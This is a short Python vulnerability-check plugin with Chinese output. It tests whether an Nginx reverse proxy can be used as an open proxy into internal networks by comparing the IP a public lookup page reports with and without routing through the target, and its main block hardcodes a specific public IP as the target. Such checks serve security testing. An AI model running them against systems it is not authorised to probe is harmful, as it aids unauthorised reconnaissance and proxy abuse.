#!/usr/bin/env python3

'''
name: Nginx反向代理可访问内网漏洞
description: Nginx反向代理可访问内网漏洞
Reference: https://mp.weixin.qq.com/s/EtUmfMxxJjYNl7nIOKkRmA
'''

import re
from app.lib.utils.request import request

class Nginx_Httproxy_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
       }

    def run(self):
        url = "http://www.net.cn/static/customercare/yourip.asp"
        try:
            local_req = request.get(url)
            pattern = re.compile('<h2>(.*?)</h2')
            local_ip = re.findall(pattern, local_req.text)[0]
            proxies = {
                'http': self.url
            }
            proxy_req = request.get(url, proxies = proxies)
            proxy_ip = re.findall(pattern, proxy_req.text)[0]
            if local_ip != proxy_ip:
                print('存在Nginx反向代理可访问内网漏洞')
            else:
                print('不存在Nginx反向代理可访问内网漏洞')
        except Exception as e:
            print('不存在Nginx反向代理可访问内网漏洞')
            #print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    Nginx_httproxy = Nginx_Httproxy_BaseVerify('http://118.123.241.138:80')
    Nginx_httproxy.run()
